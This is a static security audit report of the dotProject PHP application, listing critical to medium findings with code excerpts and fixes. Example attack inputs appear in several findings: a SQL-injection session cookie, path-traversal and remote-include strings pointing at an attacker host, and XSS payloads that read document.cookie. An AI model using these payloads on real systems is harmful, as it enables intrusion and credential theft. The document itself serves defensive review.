# Security, Privacy & Resilience Audit Report

**Target:** dotProject (legacy LAMP application — PHP / MySQL / ADOdb / Smarty / xajax / JpGraph)
**Branch audited:** `devel` (HEAD `082430f9`)
**Auditor:** Principal Application Security Engineer & Cloud Resilience Architect
**Date:** 2026-05-22
**Audit type:** Read-only static analysis (Phase 1). No code was modified.

---

## Executive Summary

This audit supersedes the prior `SECURITY_AUDIT.md` (which became outdated after the `security/audit-mitigation` merge). The recent mitigation branch closed several issues — most notably the cleartext-password emails, the password-reset flow, and SQL injection in two specific files — but **it introduced new critical defects** and **left the rest of the codebase untouched.**

The single most important finding is operational, not theoretical:

> 🛑 **`modules/admin/do_user_aed.php` contains unresolved Git merge conflict markers (lines 64, 78, 82).** The file is not valid PHP. Depending on the PHP build, this either produces a fatal parse error (denying all admin user management) or — in lenient configurations — leaves the legacy MD5 verification path active while silently skipping the new `password_hash()` call. **This must be fixed before any other remediation.**

Beyond that, three classes of issue dominate the residual risk:

1. **The password-hashing migration is incomplete and self-defeating.** `modules/public/chpwd.php` still calls `md5()` and constructs SQL via string concatenation. `modules/admin/admin.class.php::CUser::store()` re-hashes every password as raw MD5 on save — meaning that any password set through `do_user_aed.php` (after that file is fixed) gets `password_hash()`'d once, then `md5()`'d again by `store()`, producing an unverifiable double-encoded hash and locking users out. The `LDAPAuthenticator::createsqluser()` fallback also writes MD5 hashes.
2. **Pre-auth SQL injection in the session handler.** `includes/session.php` interpolates the raw cookie value `$id` into a SQL string on every request. This is exploitable before login.
3. **Pervasive, unmitigated XSS, CSRF, and missing security headers.** Zero CSRF tokens exist in the codebase. No security response headers (CSP, X-Frame-Options, HSTS, X-Content-Type-Options) are set. Hundreds of `echo $obj->field` patterns render database data raw into HTML.

In addition, a critical RCE primitive exists via `unserialize($_GET[...])` in four monitoring/control charts; a critical LFI exists in four `dotproject_plus` tab files; and `install/docs/phpinfo.php` is exposed unauthenticated.

| Severity | Count |
|---|---|
| **Critical** | 11 |
| **High** | 18 |
| **Medium** | 14 |
| **Low** | 8 |

Recommended action: **freeze deploys** until C1–C5 (below) are remediated, then proceed through the High findings in priority order.

---

## Verification of Recent Mitigations

The `security/audit-mitigation` branch made four substantive changes. Each was verified.

| Mitigation claim | Status | Notes |
|---|---|---|
| Token-based password reset replacing emailed plaintext (`includes/sendpass.php`) | ✅ **Substantively correct** but with caveats — see H5 (storage column reuse) and H8 (timing oracle). |
| MD5 → `password_hash()` migration | ⚠️ **Incomplete** — only `do_user_aed.php` was touched (and broken — see C1). MD5 still active in `chpwd.php` (C2), `admin.class.php::store()` (C3), `LDAPAuthenticator` (H6). |
| SQL injection fixes in user creation and password reset | ✅ Verified in `sendpass.php` (uses `?` bindings) and the `userEx` lookup at `do_user_aed.php:50`. ❌ The merge conflict's HEAD half re-introduces `addWhere("user_id = $user_id_aed")` at line 69. |
| File-based rate limiter on login + password reset (`classes/ratelimiter.class.php`) | ⚠️ **Functional but defective** — TOCTOU race, log files in publicly-readable `files/temp/`, no `flock()`, IPv6-rotation bypass, success path not recorded. See H9. |
| Cleartext-password email on new user creation | ✅ Removed. `do_user_aed.php:121-132` now sends a "use Forgot Password" instruction. |

---

## CRITICAL FINDINGS

### C1. Unresolved Git merge conflict in production auth file

* **Severity:** Critical (file does not parse — total DoS of user administration; or, in lenient PHP configurations, legacy MD5 path re-activates)
* **Location:** `modules/admin/do_user_aed.php:64`, `:78`, `:82`
* **Description:** The file contains literal conflict markers from an unfinished `security/audit-mitigation` merge:
    ```php
    64: <<<<<<< HEAD
    65: if (!$isNewUser && $AppUI->user_id == $user_id_aed) {
    ...
    72:     if ($db_pwd != $_POST['user_password']) {
    73:         if (!isset($_POST['old_password']) || md5($_POST['old_password']) != $db_pwd) {
    ...
    78: =======
    79: // Security Mitigation: Use a strong, modern hashing algorithm for the new password.
    80: if (isset($_POST['user_password']) && $_POST['user_password']) {
    81:     $obj->user_password = password_hash($_POST['user_password'], PASSWORD_DEFAULT);
    82: >>>>>>> security/audit-mitigation
    ```
* **Exploitation/failure scenario:** Standard PHP refuses to compile the file → admin user management is broken site-wide. If the deployment uses a PHP build or pre-processor that tolerates the markers, the HEAD half wins and the password is verified with `md5(...)` using a loose `!=` (magic-hash bypass possible against `$2y$...` strings interpreted as `0`), while the new `password_hash()` call is never executed.
* **Mitigation:** Resolve the merge. Keep the `security/audit-mitigation` block (line 79-81). Delete the entire HEAD self-edit block; replace its purpose with a proper old-password check using `password_verify($_POST['old_password'], $db_pwd)` (constant-time) and `hash_equals()`/strict comparison. Drop the line-69 string-concatenated `addWhere("user_id = $user_id_aed")` in favor of `$q->addWhere('user_id = ?', $user_id_aed)`.

---

### C2. `chpwd.php` still authenticates with MD5 and concatenates SQL

* **Severity:** Critical (bypasses the entire `password_hash()` migration and contains SQLi)
* **Location:** `modules/public/chpwd.php:12-23`
* **Description:**
    ```php
    $old_pwd = db_escape(trim(dPgetCleanParam($_POST, 'old_pwd', null)));
    ...
    $old_md5 = md5($old_pwd);
    $q->addWhere("user_password='$old_md5' AND user_id=$user_id");
    if ($AppUI->user_type == 1 || $q->loadResult() == $user_id) {
    ```
* **Exploitation:** Once a user's password is upgraded to bcrypt (via login rehash), they can no longer change it through this form — MD5 will never match the stored `$2y$...`. Worse, **any user with `user_type == 1` (admin) bypasses the old-password check entirely** and may set any other user's password (IDOR + admin-impersonation). The downstream `CUser::store()` then re-hashes the new password as MD5 (see C3), producing a usable login but in MD5.
* **Mitigation:** Replace lines 18-24 with:
    ```php
    $q = new DBQuery;
    $q->addQuery('user_password');
    $q->addTable('users');
    $q->addWhere('user_id = ?', $user_id);
    $stored = $q->loadResult();
    $is_admin = ($AppUI->user_type == 1 && $AppUI->user_id != $user_id);
    if ($is_admin || ($stored && password_verify($old_pwd, $stored))) {
        // ... allow change
    }
    ```
    Remove `db_escape` for `$user_id` (use `(int)` cast already on line 6). Force admin self-password-changes through the regular old-password check.

---

### C3. `CUser::store()` re-hashes every password as raw MD5

* **Severity:** Critical (silently corrupts hashes and re-introduces MD5)
* **Location:** `modules/admin/admin.class.php:66`, `:76`
* **Description:**
    ```php
    // update branch
    if ($pwd != $this->user_password) {
        $this->user_password = md5($this->user_password);   // line 66
    ...
    // insert branch
    $this->user_password = md5($this->user_password);       // line 76
    ```
* **Exploitation:** Every code path that calls `$user->store()` regresses passwords to MD5. Two collisions occur:
    - `do_user_aed.php` (once fixed) pre-hashes with `password_hash()` then calls `store()`. The stored hash differs from the live value → `store()` runs `md5($already_bcrypted)` → garbage stored → user locked out.
    - `chpwd.php` (C2) sets `$user->user_password = $new_pwd1;` (plaintext) → `store()` writes `md5($plaintext)` → password is stored in MD5 forever.
    Line 63 (`addWhere("user_id = $this->user_id")`) is also a string-concatenated query; `user_id` is integer-typed so SQLi is constrained but it should be parameterized as a defense-in-depth.
* **Mitigation:** Replace both `md5()` calls with logic that detects whether the supplied value is already a Modern Hash and skips re-hashing:
    ```php
    if (password_get_info($this->user_password)['algo'] === 0) {
        $this->user_password = password_hash($this->user_password, PASSWORD_DEFAULT);
    }
    ```
    Parameterize line 63: `$q->addWhere('user_id = ?', $this->user_id);`

---

### C4. Pre-auth SQL injection in the session handler

* **Severity:** Critical (unauthenticated; pre-login)
* **Location:** `includes/session.php:45`, `:81`, `:110`, `:123`
* **Description:**
    ```php
    function dPsessionRead($id)
    {
        $q = new DBQuery;
        ...
        $q->addWhere("session_id = '$id'");
        $qid =& $q->exec();
    ```
    `$id` is the raw value of the session cookie (`dotproject` by default), which PHP passes through to user-space session handlers without sanitization unless `session.use_strict_mode` is on. The cookie is fully attacker-controlled.
* **Exploitation:** Attacker sends `Cookie: dotproject=' UNION SELECT 1,user_password FROM dotp_users WHERE user_id=1-- ` and triggers blind/UNION-based extraction on every request — before authentication. The same pattern appears in `dPsessionDestroy`, `dPsessionWrite`, and `dPsessionGC`.
* **Mitigation:** `$q->addWhere('session_id = ?', $id);` (DBQuery supports placeholders — used correctly in `sendpass.php`). Add a regex validator at session start: `if (!preg_match('/^[a-zA-Z0-9,-]{16,128}$/', $id)) { session_id(bin2hex(random_bytes(16))); }`. Enable `session.use_strict_mode = 1` in `base.php`.

---

### C5. No CSRF protection on any state-changing endpoint

* **Severity:** Critical (every `do_*.php` is cross-site forgeable)
* **Location:** Application-wide. Verified by `grep -rln -i 'csrf\|nonce\|anti_forgery' .` returning zero matches.
* **Description:** No anti-CSRF token field is generated, embedded, or verified anywhere. Combined with the missing `SameSite` cookie attribute (H2), any authenticated victim visiting an attacker page submits arbitrary actions via their session cookie.
* **High-impact unprotected endpoints:**
    - `modules/admin/do_user_aed.php` — attacker creates a new admin user in the victim admin's name
    - `modules/admin/do_perms_aed.php` — grant arbitrary ACL permissions
    - `modules/projects/do_project_aed.php` — delete/rewrite any project
    - `modules/backup/do_backup.php`, `do_restore.php` — exfiltrate or replace the whole DB
    - `modules/public/do_reset_password.php` — once an attacker triggers a reset for a victim, they can CSRF the victim's browser to set the password to a known value
* **Mitigation:** Issue a per-session token in `$_SESSION['csrf']` (cryptographically random, 32 bytes hex). Render in every form via a helper `<?php echo csrf_field(); ?>`. Validate centrally in a bootstrap section of `index.php` *before* dispatching to any `do_*.php` script. Use `hash_equals()` for the comparison.

---

### C6. Local File Inclusion via `show_external_page`

* **Severity:** Critical (authenticated LFI → RCE if combined with file upload)
* **Location:**
    - `modules/dotproject_plus/projects_tab.execution.php:139`
    - `modules/dotproject_plus/projects_tab.planning_and_monitoring.php:866`
    - `modules/dotproject_plus/dotproject_plus/projects_tab.execution.php:129`
    - `modules/dotproject_plus/dotproject_plus/projects_tab.planning_and_monitoring.php:852`
* **Description:**
    ```php
    if (isset($_GET["show_external_page"]) && $_GET["show_external_page"] != "") {
        include_once DP_BASE_DIR . $_GET["show_external_page"];
    }
    ```
* **Exploitation:** `?show_external_page=/../../../../etc/passwd` → arbitrary file read. `?show_external_page=/includes/config.php` → leaks DB credentials. With `allow_url_include=On`, `?show_external_page=http://attacker/shell.txt` → RCE. With the bundled file-upload module, an attacker uploads a `.php` disguised as `.jpg` and includes it for RCE on any deployment.
* **Mitigation:** Whitelist:
    ```php
    $allowed = ['summary' => '/modules/.../summary.php', 'detail' => '/modules/.../detail.php'];
    $key = $_GET['show_external_page'] ?? '';
    if (isset($allowed[$key])) { include_once DP_BASE_DIR . $allowed[$key]; }
    ```

---

### C7. RCE-capable `unserialize($_GET[...])` in monitoring/control charts

* **Severity:** Critical (PHP object injection on unauthenticated input)
* **Location:**
    - `modules/monitoringandcontrol/grafico/line_Graph_Cost.php:7-12`
    - `modules/monitoringandcontrol/grafico/line_Graph_Schedule.php:7-12`
    - `modules/monitoringandcontrol/grafico/line_Graph_Quality_pie.php:11-12`
    - `modules/monitoringandcontrol/grafico/line_Graph_Quality_bar.php:10-12`
* **Description:**
    ```php
    $vlReal = unserialize(urldecode($_GET["vlReal"]));
    $vlAgregado = unserialize(urldecode($_GET["vlAgregado"]));
    $dtConsultaArray = unserialize(urldecode($_GET["dtConsultaArray"]));
    ```
    Files include JpGraph directly without any authentication gate.
* **Exploitation:** Any class in the autoloaded universe (ADOdb, htmLawed, JpGraph) with a `__destruct` / `__wakeup` / `__toString` magic method becomes a deserialization gadget. The codebase is large enough that a working chain to file write, file delete, SSRF, or RCE is plausible.
* **Mitigation:** Replace with `json_decode($_GET["vlReal"], true)` and validate types (`is_array`, `array_walk_recursive(...) === 'is_numeric'`). Add an auth check at the top: `require_once base.php; if (!$AppUI->doLogin()) { http_response_code(401); exit; }`.

---

### C8. `install/docs/phpinfo.php` exposed unauthenticated

* **Severity:** Critical (information disclosure: full environment, DB host hints, secrets in `$_SERVER`)
* **Location:** `install/docs/phpinfo.php` (verified to exist, 19 bytes, contents `<?php phpinfo(); ?>`)
* **Description:** No `.htaccess` guard in `install/docs/`. A direct GET reveals every PHP ini value, loaded extensions, OPcache state, environment variables, and request headers.
* **Mitigation:** Delete the file. Add a `Deny from all` `.htaccess` to `install/` post-setup, and ideally delete the entire `install/` directory in production deployments.

---

### C9. Uploaded files stored inside the webroot

* **Severity:** Critical (defense relies entirely on Apache; bypassed on nginx, lighttpd, PHP-FPM-only)
* **Location:** `modules/files/files.class.php:244` (file storage path), `files/.htaccess`, `files/temp/.htaccess`
* **Description:** `$filepath = DP_BASE_DIR . '/files/' . $this->file_project . '/' . $this->file_real_filename;` — files live under the document root. Access protection is only `Options -All / deny from all` in `.htaccess`. The same directory holds the rate limiter's logs (see H9). `file_real_filename` is built with `uniqid(rand())` — predictable under older PHP.
* **Exploitation:** Re-host on nginx → every uploaded HR document, invoice, customer attachment, and rate-limit log is directly fetchable.
* **Mitigation:** Move storage outside `DP_BASE_DIR` (e.g. `/var/lib/dotproject/files/`); always gate reads through `fileviewer.php`. Replace `uniqid(rand())` with `bin2hex(random_bytes(16))`. Ship nginx/Caddy config snippets that also `deny` those paths.

---

### C10. Stored XSS via attacker-controlled `Content-Type` on uploaded files

* **Severity:** Critical (account takeover via HTML/SVG upload)
* **Location:** `fileviewer.php:163-166`; ingest at `modules/files/do_file_aed.php:123`
* **Description:**
    ```php
    header('Content-type: ' . $file['file_type']);
    header('Content-disposition: attachment; filename="' . $file['file_name'] . '"');
    ```
    `file_type` is read from `$_FILES['formfile']['type']` — the client-supplied multipart header, fully attacker-controlled. It's stored verbatim and echoed back as the response `Content-Type`. There is no `X-Content-Type-Options: nosniff` (see C11) and no CSP.
* **Exploitation:** Attacker uploads `payload.html` with multipart `Content-Type: text/html`; any user clicking the resulting file link gets JS execution in the application origin → session takeover.
* **Mitigation:** Validate `file_type` against a strict whitelist of expected MIMEs; otherwise force `application/octet-stream`. For `.html`/`.svg`/`.xml`/`.xhtml` extensions, *always* force `application/octet-stream` regardless of stored MIME. Always emit `X-Content-Type-Options: nosniff`. Sanitize `file_name` (`preg_replace('/[\r\n"]/', '_', $file['file_name'])`) before placing in `Content-Disposition`.

---

### C11. Stored XSS in JavaScript context — project name interpolation

* **Severity:** Critical (no escaping into a JS string literal)
* **Location:** `modules/projects/view.php:219-221`
* **Description:**
    ```php
    function delIt() {
        var projectName = "<?php echo $obj->project_name; ?>";
        var wroteName = prompt("<?php echo $AppUI->_('confirmDelete') . ' \"' . $obj->project_name . '\" \n'
    ```
* **Exploitation:** Project named `";alert(document.cookie);//` executes JS for any user opening the project view. Combined with C5 (no CSRF) and H2 (no HttpOnly), this is full account takeover.
* **Mitigation:** `var projectName = <?php echo json_encode($obj->project_name, JSON_HEX_TAG|JSON_HEX_AMP|JSON_HEX_APOS|JSON_HEX_QUOT); ?>;`. For the prompt text, wrap entire interpolation with `htmlspecialchars(..., ENT_QUOTES|ENT_HTML5, 'UTF-8')` before passing.

---

## HIGH FINDINGS

### H1. Login does not regenerate session ID — session fixation

* **Location:** Login flow in `index.php:151-159`, `classes/ui.class.php::login()` (lines ~718-775)
* **Description:** No `session_regenerate_id(true)` is called after a successful login.
* **Exploitation:** Attacker sets a chosen session cookie on the victim's browser (subdomain XSS, MITM on a non-HTTPS subdomain, etc.); when the victim authenticates, the attacker's pre-known session ID is now an authenticated admin session.
* **Mitigation:** Immediately after a successful `$AppUI->login()`, call `session_regenerate_id(true);` and reassign `$_SESSION['AppUI']`.

### H2. Session cookie missing `HttpOnly`, `Secure`, `SameSite`; no HSTS

* **Location:** `includes/session.php:240` — `session_set_cookie_params($max_time, $cookie_dir);` (only 2-arg form)
* **Description:** No `HttpOnly` flag (any reflected XSS → cookie theft). No `Secure` flag (TLS-strip vulnerable). No `SameSite` (compounds C5). No `Strict-Transport-Security` header anywhere.
* **Mitigation:**
    ```php
    session_set_cookie_params([
        'lifetime' => $max_time, 'path' => $cookie_dir,
        'secure' => true, 'httponly' => true, 'samesite' => 'Lax',
    ]);
    header('Strict-Transport-Security: max-age=63072000; includeSubDomains');
    ```

### H3. Logout does not destroy server-side session

* **Location:** `index.php:70-82`, `classes/ui.class.php:827` (empty stub)
* **Description:** On `?logout`, `registerLogout()` is called and `$_SESSION['AppUI']` is overwritten with a fresh `CAppUI`, but `session_destroy()` / `dPsessionDestroy()` is never called. The session row stays in the DB; a previously-captured cookie remains valid.
* **Mitigation:** On logout: `$_SESSION = []; session_unset(); session_destroy(); setcookie(session_name(), '', time()-3600, $cookie_dir);` and explicitly `DELETE FROM dotp_sessions WHERE session_id = ?`.

### H4. `doLogin()` semantics are inverted/ambiguous

* **Location:** `classes/ui.class.php:833-836`
* **Description:**
    ```php
    function doLogin() {
        return ($this->user_id < 0) ? true : false;
    }
    ```
    `user_id` initializes to `0` in `CAppUI`, never `-1`. Callers in `index.php` use it both as "needs to log in" and "is logged in" depending on context. Auth checks built on this are unreliable.
* **Mitigation:** Rename to `isLoggedIn()`, return `((int)$this->user_id > 0)`, audit every caller. Add a wrapper `requireLogin()` that does the redirect.

### H5. Password-reset token stored in shared `user_custom` JSON column

* **Location:** `includes/sendpass.php:60-68`, `modules/public/do_reset_password.php:58-62`
* **Description:** Token hash is stored as JSON in `user_custom` — a field shared with all custom-field data. Issuance overwrites any unrelated custom-field payload; consumption empties the entire column. Concurrent custom-field edits can blow away the token. The mitigation comment in `sendpass.php:58-61` acknowledges the hack.
* **Mitigation:** Add a dedicated `dotp_password_resets` table: `(user_id PK, token_hash, expires_at, used_at)`. Enforce single-use atomically with `UPDATE ... SET used_at = NOW() WHERE used_at IS NULL` and check `affected_rows == 1`.

### H6. LDAP authenticator seeds local users with MD5

* **Location:** `classes/authenticator.class.php:348`
* **Description:**
    ```php
    function createsqluser($username, $password, $ldap_attribs = Array()) {
        $hash_pass = MD5($password);
        ...
        $q->addInsert('user_password', $hash_pass);
    ```
* **Mitigation:** Replace `MD5($password)` with `password_hash($password, PASSWORD_DEFAULT)`. Same fix for `PostNukeAuthenticator::createsqluser` (line ~127).

### H7. Most `do_*.php` endpoints perform no permission check

* **Location:** Sampled `do_*.php` files across modules
* **Description:** Of seven sampled endpoints, only `do_user_aed.php`, `do_perms_aed.php`, `do_backup.php`, `do_restore.php`, `do_user_transfer.php` and `do_file_aed.php` (partial) call `getPermission()`. **`do_project_aed.php`, `do_company_aed.php`, `do_task_aed.php` rely entirely on the object's internal `canDelete()` / `store()`** — none checks whether the caller may *create*.
* **Mitigation:** Add `if (!getPermission($m, $action)) { $AppUI->redirect('m=public&a=access_denied'); }` to every `do_*` action. Verify the object owner for edit/delete (IDOR).

### H8. Login timing oracle distinguishes "user not found" from "wrong password"

* **Location:** `classes/authenticator.class.php:180-211`; rate-limit path in `index.php:111-120`
* **Description:** When the user doesn't exist, the function short-circuits before any hashing. When the user exists, `password_verify()` (bcrypt) runs (~50–200ms). Statistical timing reveals valid usernames. Same pattern in `sendpass.php`.
* **Mitigation:** On the not-found branch, still call `password_verify($password, '$2y$10$dummydummydummydummydummydummydummydummydummydummy00')` to equalize timing.

### H9. Rate limiter is racy, bypassable, and writes to a publicly-readable directory

* **Location:** `classes/ratelimiter.class.php` (entire file); call sites at `index.php:111-120`, `:135-142`
* **Description:**
    - **TOCTOU race:** `recordAttempt()` does read (`getAttempts`) → modify → `file_put_contents` with no `flock()`. Concurrent attempts overwrite each other; firing 50 parallel requests records only a handful.
    - **Storage location:** `DP_BASE_DIR . '/files/temp/ratelimit_*.log'` — `files/temp/.htaccess` only blocks via Apache; on any other web server the rate-limit history is directly readable. (See C9.)
    - **IP source:** `$_SERVER['REMOTE_ADDR']` only. Behind a reverse proxy, all users share one bucket (self-DoS). From an attacker on IPv6, /64 rotation yields effectively unlimited buckets.
    - **Success not recorded for login:** `index.php:152-154` only calls `recordAttempt()` on failure. A successful credential-stuffing hit is never recorded.
    - **No global cap; no garbage collection** of stale files (slow disk growth).
* **Mitigation:** Wrap the read-modify-write in a `flock(LOCK_EX)` critical section using `fopen($file, 'c+')`. Move storage outside the webroot. Add a global IP-block table for repeat offenders with exponential backoff. Honor `X-Forwarded-For` only when the immediate `REMOTE_ADDR` is in a trusted-proxies allowlist. Tighten `files/temp/.htaccess` to `Deny from all` as a stop-gap.

### H10. Reflected XSS on the login page via `redirect` parameter

* **Location:** `style/default/login.php:118`; same pattern in `style/material/login.php:169`, `style/dp-grey-theme/login.php:29`, `style/wps-redmond/login.php:25`, `style/amp/login.php:34`
* **Description:** `<input type="hidden" name="redirect" value="<?php echo $redirect; ?>" />` — `$redirect` is sourced from `$_SERVER['QUERY_STRING']` in `index.php:187` with only `strip_tags` applied. Payloads with quotes / `on*=` event handlers survive.
* **Mitigation:** `echo htmlspecialchars($redirect, ENT_QUOTES|ENT_HTML5, 'UTF-8');` at every echo site; ideally sanitize at source in `index.php:187`.

### H11. Stored XSS via project / task URL fields (javascript: scheme)

* **Location:** `modules/projects/view.php:341, 347`, `modules/tasks/view.php:233`
* **Description:** `project_url`, `project_demo_url`, `task_related_url` are echoed straight into `href="..."`. A value of `javascript:alert(document.cookie)` executes on click.
* **Mitigation:** Whitelist scheme before output:
    ```php
    $safe = preg_match('#^https?://#i', $obj->project_url) ? $obj->project_url : '';
    echo htmlspecialchars($safe, ENT_QUOTES|ENT_HTML5, 'UTF-8');
    ```

### H12. Pervasive stored XSS in module render pages

* **Location:** 100+ files across `modules/tasks/`, `modules/projects/`, `modules/files/`, `modules/forums/`, `modules/contacts/`, `modules/companies/`
* **Description:** Application-wide pattern of `echo $obj->something` or `echo $row['column']` without escaping. Representative examples:
    - `modules/tasks/view.php:208` — `echo @$obj->task_name;`
    - `modules/tasks/view.php:200` — `style="background-color:#<?php echo $obj->project_color_identifier;?>"` (CSS-context injection)
    - `modules/projects/view.php:364` — `echo str_replace(chr(10), "<br>", $obj->project_description);`
    - `modules/files/index_table.php:385,392,511,514` — file description rendered raw in both `title=""` and cell text
* **Mitigation:** Introduce a global helper in `includes/main_functions.php`:
    ```php
    function h($s) { return htmlspecialchars((string)$s, ENT_QUOTES|ENT_HTML5, 'UTF-8'); }
    ```
    Replace `echo $obj->x` with `echo h($obj->x)` across module views. For free-text fields, use `nl2br(h(...))` instead of `str_replace + raw`.

### H13. No security response headers anywhere

* **Location:** Application-wide. `grep -rn "Content-Security-Policy\|X-Frame-Options\|X-Content-Type-Options\|Strict-Transport-Security\|Referrer-Policy" .` returns zero hits.
* **Description:** No CSP (any XSS in H10/H11/H12 becomes ATO). No `X-Frame-Options` (clickjacking against destructive actions). No `nosniff` (compounds C10).
* **Mitigation:** Add in `index.php` immediately after `dPsessionStart()`:
    ```php
    header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'none'; frame-ancestors 'self'");
    header('X-Frame-Options: SAMEORIGIN');
    header('X-Content-Type-Options: nosniff');
    header('Referrer-Policy: strict-origin-when-cross-origin');
    ```

### H14. SQL injection — `modules/helpdesk/list.php:91-100`

* **Location:** `modules/helpdesk/list.php:91-100`, `:64`
* **Description:**
    ```php
    if (($_GET['project'] > 0) && ($company == -1)) {
        $q->addWhere('project_id='.$_GET['project']);
    ...
    $tarr[] = "hi.item_company_id=$company";
    ```
    `$_GET['search']` is also concatenated into a `LIKE` clause at line 64.
* **Mitigation:** Cast to `(int)`; use placeholders for the LIKE clause: `$q->addWhere('LOWER(hi.item_title) LIKE ?', '%' . $search . '%')`.

### H15. SQL injection — `modules/forums/forums.class.php:108` (CForum::search)

* **Location:** `modules/forums/forums.class.php:108`
* **Description:** `$q->addWhere("(message_title LIKE '%$keyword%' OR message_body LIKE '%$keyword%')");`
* **Exploitation:** Forum search exposes a UNION extraction path for password hashes.
* **Mitigation:** `$q->addWhere("message_title LIKE ? OR message_body LIKE ?", ['%' . $keyword . '%', '%' . $keyword . '%']);`

### H16. SQL injection — `ORDER BY` in 6+ list views

* **Location:** `modules/admin/vw_active_usr.php:38`, `modules/companies/vw_companies.php:50`, `modules/projects/projects.class.php:716`, `modules/risks/index_table.php:126-133`, `modules/forums/view_topics.php:49`, `modules/groups/modules/contacts/index.php:79`
* **Description:** `$q->addOrder($orderby . ' ' . $orderdir);` with `$orderby` from `$_GET`. ORDER BY can't be parameterized — it must be whitelisted. `modules/projects/departments_tab.view.projects.php:48` already does this correctly with `in_array(..., $valid_ordering)`.
* **Mitigation:** Replicate the existing `in_array($_GET['orderby'], $valid_ordering)` pattern in every affected file.

### H17. Backtick `exec` on uploaded file with attacker-influenced argv

* **Location:** `modules/files/files.class.php:255-277`
* **Description:**
    ```php
    $parser = @$dPconfig['parser_' . $this->file_type];
    $parser = $parser . ' ' . $filepath;
    $x = (($pos !== false) ? `$parser -` : `$parser`);
    ```
    `$this->file_type` is the client-supplied MIME header (`$_FILES['formfile']['type']`); `$filepath` contains attacker-influenced project/file IDs.
* **Mitigation:** `escapeshellarg($filepath)` before concatenation; reject MIME types not in a strict whitelist before the `parser_*` lookup. Migrate to `proc_open()` with an argv array.

### H18. DB connection failure → `die()` with raw error message

* **Location:** `includes/db_adodb.php:33`, plus `exit(db_error())` in `includes/db_connect.php:62, 92, 115, 133, 214`
* **Description:** `die('FATAL ERROR: Connection to database server failed');` returns HTTP 200 with a string body. Per-query helpers `exit(db_error())` print the raw MySQL error (with the failing SQL and table/column names) directly to the user.
* **Mitigation:** Replace with `http_response_code(503); header('Retry-After: 60'); error_log('DB error: '.$db->ErrorMsg()); echo 'Service temporarily unavailable.'; exit;`. In query helpers, `throw new RuntimeException('db error')` and let a global exception handler (M3) produce a clean 500.

---

## MEDIUM FINDINGS

### M1. `user_password` column too narrow for bcrypt

* **Location:** `db/dotproject.sql:397` — `user_password varchar(32) NOT NULL default '',`
* **Description:** bcrypt produces 60-char strings (Argon2: 97+). `includes/db_connect.php:29` explicitly sets `SET sql_mode := ''` so truncation is **silent**. First successful login on a legacy account re-hashes to bcrypt, persists a 32-char fragment, and every subsequent login fails.
* **Mitigation:** `ALTER TABLE %dbprefix%users MODIFY user_password VARCHAR(255) NOT NULL DEFAULT '';` Drop the `KEY idx_pwd (user_password)` index (line 406) — indexing a high-entropy hash is wasteful and confidential.

### M2. `display_errors = 1` force-enabled in `base.php`

* **Location:** `base.php:23` — `ini_set('display_errors', 1);`
* **Description:** Applied on every request, including production. Any uncaught warning emits absolute paths and DB DSN fragments to the browser.
* **Mitigation:** Gate behind `$dPconfig['debug']`; default to `0`. Log to `error_log` instead.

### M3. No global exception/error handler

* **Location:** `base.php`, `index.php` — no `set_exception_handler()` / `set_error_handler()` calls
* **Description:** Combined with M2, uncaught exceptions are rendered to the browser with full stack info.
* **Mitigation:**
    ```php
    set_exception_handler(function($e){ error_log('[uncaught] '.$e); http_response_code(500); echo 'Internal error'; exit; });
    set_error_handler(function($n,$s,$f,$l){ if(!(error_reporting()&$n))return false; throw new ErrorException($s,0,$n,$f,$l); });
    ```

### M4. No application-level upload size cap; per-request 10-minute exec budget

* **Location:** `modules/files/do_file_aed.php:105` (`set_time_limit(600); ignore_user_abort(1);`); same file checks only `size < 1`
* **Description:** A single client can hold an FPM worker for 10 minutes. No per-IP throttle. Whatever PHP accepts is written to disk.
* **Mitigation:** Wrap entrypoint in `RateLimiter('upload', 20, 60)`. Cap explicitly: `if ($upload['size'] > $maxBytes) reject;`. Drop `set_time_limit` to 120.

### M5. SMTP password leaked to debug log via `dprint`

* **Location:** `classes/libmail.class.php:475-480` (SMTP AUTH frames), `:587-592` (`dprint` of raw `socketSend` content)
* **Description:** With debug on, base64-encoded SMTP username/password and full message bodies are written to `files/debug.log` (inside webroot — see C9).
* **Mitigation:** Skip `dprint` calls in the AUTH branch or mask: `dprint(__FILE__, __LINE__, 12, 'sending: ***')` when sending an AUTH frame.

### M6. Default credentials shipped in committed `includes/config.php`

* **Location:** `includes/config.php:11-16` — `dbuser='dotproject'`, `dbpass='dotproject'`
* **Description:** Credentials are in version control. Even if the file isn't web-readable (the `die()` guard helps), the git history is the leak.
* **Mitigation:** Remove `config.php` from VCS; add to `.gitignore`; rotate; ship only `config-dist.php`.

### M7. `includes/.htaccess` only blocks `gateway.pl`

* **Location:** `includes/.htaccess`
* **Description:** Relies on every PHP file in `includes/` having a `if (!defined('DP_BASE_DIR')) die(...)` guard. One forgotten guard → direct execution.
* **Mitigation:** Replace with `Deny from all` / `Require all denied`.

### M8. PostNuke authenticator `unserialize()` of `$_REQUEST`

* **Location:** `classes/authenticator.class.php:69-78`
* **Description:** `$user_data = unserialize(gzuncompress(base64_decode(urldecode($_REQUEST['userdata']))));` — classic PHP object-injection RCE primitive. Only active when `auth_method='pn'`.
* **Mitigation:** Disable PostNuke auth, or replace with `json_decode` over an HMAC-signed envelope.

### M9. Smarty templates render raw `{$var}` without `|escape`

* **Location:** `lib/smarty/templates/phpgacl/edit_group.tpl:32-47` and other phpGACL admin templates
* **Description:** Smarty 2.x does not auto-escape. Every `{$var}` is a potential XSS sink if it holds user data.
* **Mitigation:** `$smarty->default_modifiers = ['escape:"html"'];` at template-engine bootstrap; or rewrite as `{$var|escape:'html'}`.

### M10. DOM XSS in `monitoringandcontrol/js/novaPendencia.js:156`

* **Location:** `modules/monitoringandcontrol/js/novaPendencia.js:156`
* **Description:** `div.innerHTML = "<input ... onclick=deleteRole('"+row.id+"')>";` — `row.id` is concatenated into both an HTML stream and a JS event handler.
* **Mitigation:** Build the element with `document.createElement`, set `textContent`, add the handler via `addEventListener`.

### M11. Open redirect / header injection in `fileviewer.php` login flow

* **Location:** `fileviewer.php:59,69` — `header('Location: fileviewer.php?'.$redirect);` where `$redirect` is `$_REQUEST`-sourced
* **Description:** No validation of the redirect string. Compounds H10.
* **Mitigation:** `if (!preg_match('/^[a-zA-Z0-9_=&.\-]*$/', $redirect)) $redirect = '';`

### M12. PII unencrypted at rest

* **Location:** `db/dotproject.sql:56-73`, plus invoice/payment/finance tables
* **Description:** `contact_first_name`, `contact_last_name`, `contact_email*`, `contact_phone*`, `contact_address*`, financial amounts — all plain VARCHAR.
